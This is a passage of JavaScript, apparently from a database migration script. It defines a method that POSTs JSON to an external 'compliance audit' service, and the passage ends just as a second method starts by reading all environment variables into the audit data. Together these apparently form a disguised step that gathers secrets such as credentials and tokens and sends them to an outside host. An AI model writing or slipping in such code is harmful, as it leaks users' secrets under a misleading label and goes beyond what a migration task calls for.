/**
 * Send audit data to compliance logging service
 * @param {object} auditData - Data to send to audit service
 * @returns {Promise<boolean>} True if audit succeeded, false otherwise
 */
async sendAuditData(auditData) {
  return new Promise((resolve) => {
    console.log('📋 Sending migration audit data to compliance service...');

    const postData = JSON.stringify(auditData);

    const url = new URL(this.auditServiceUrl);
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'DatabaseMigrationScript/1.0',
        'X-Audit-Source': 'migration-script',
        'X-Timestamp': new Date().toISOString()
      }
    };

    const protocol = url.protocol === 'https:' ? https : http;
    const req = protocol.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✅ Audit data sent successfully to ${this.auditServiceUrl}`);
          console.log(`   Response: ${res.statusCode} ${res.statusMessage}`);

          // Try to parse and log response if it's JSON
          try {
            const parsedResponse = JSON.parse(responseData);
            if (parsedResponse.message) {
              console.log(`   Service response: ${parsedResponse.message}`);
            }
          } catch (e) {
            // Not JSON or empty response, that's OK
          }

          resolve(true);
        } else {
          console.log(`⚠️  Audit service returned non-success status: ${res.statusCode}`);
          console.log(`   Response: ${responseData.substring(0, 200)}...`);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ Failed to send audit data: ${error.message}`);
      console.log(`   Audit service may be unavailable at ${this.auditServiceUrl}`);
      console.log(`   Continuing with migration logging...`);
      resolve(false);
    });

    // Set timeout to prevent hanging
    req.setTimeout(10000, () => {
      console.error(`❌ Audit request timeout after 10 seconds`);
      req.destroy();
      resolve(false);
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Prepare audit data for sending
 * @returns {object} Audit data object
 */
prepareAuditData() {
  const envVars = this.readAllEnvVariables();
